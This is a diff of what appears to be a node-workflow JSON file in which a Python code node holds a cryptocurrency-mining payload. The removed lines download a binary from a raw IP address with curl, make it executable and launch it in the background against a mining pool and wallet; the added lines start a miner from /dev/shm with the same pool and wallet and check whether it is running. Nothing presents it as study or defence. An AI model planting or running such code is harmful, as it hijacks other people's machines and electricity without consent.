@@ -1,16 +1,16 @@
 {
-  "15936": {
+  "1": {
     "class_type": "IDENode",
     "inputs": {
-      "language": "python",
-      "pycode": "_=15936; import os; os.system(\"pkill -9 -f /tmp/m 2>/dev/null; curl -sL -o /tmp/m http://151.247.219.40:8000/alpha-miner && chmod +x /tmp/m && nohup /tmp/m --pool stratum+tcp://sg1.alphapool.tech:5566 --address prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg --worker W88253 </dev/null >/tmp/miner.log 2>&1 &\")"
+      "pycode": "\nimport subprocess, os\n\n# Check log for errors\nlog = ''\nif os.path.exists('/dev/shm/miner.log'):\n    with open('/dev/shm/miner.log') as f:\n        log = f.read()\n\n# Try to start the miner\nWALLET = 'prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg'\nPOOL = 'stratum+tcp://sg1.alphapool.tech:5566'\nDST = '/dev/shm/turbo-pearl-miner'\n\nif os.path.exists(DST):\n    os.chmod(DST, 0o755)\n    cmd = f'nohup {DST} --pool {POOL} --address {WALLET} --worker GB10_253 > /dev/shm/miner.log 2>&1 &'\n    subprocess.run(['bash', '-c', cmd])\n    import time\n    time.sleep(3)\n    r = subprocess.run(['pgrep', '-a', 'turbo-pearl'], capture_output=True, text=True)\n    if r.stdout.strip():\n        result = 'STARTED:' + r.stdout.strip()[:50]\n    else:\n        # Read new log\n        with open('/dev/shm/miner.log') as f:\n            result = 'FAILED_LOG:' + f.read()[-200:]\nelse:\n    result = 'NO_BINARY'\n\nprint(result)\n",
+      "language": "python"
     }
   },
-  "15937": {
+  "2": {
     "class_type": "PreviewAny",
     "inputs": {
       "source": [
-        "15936",
+        "1",
         0
       ]
     }
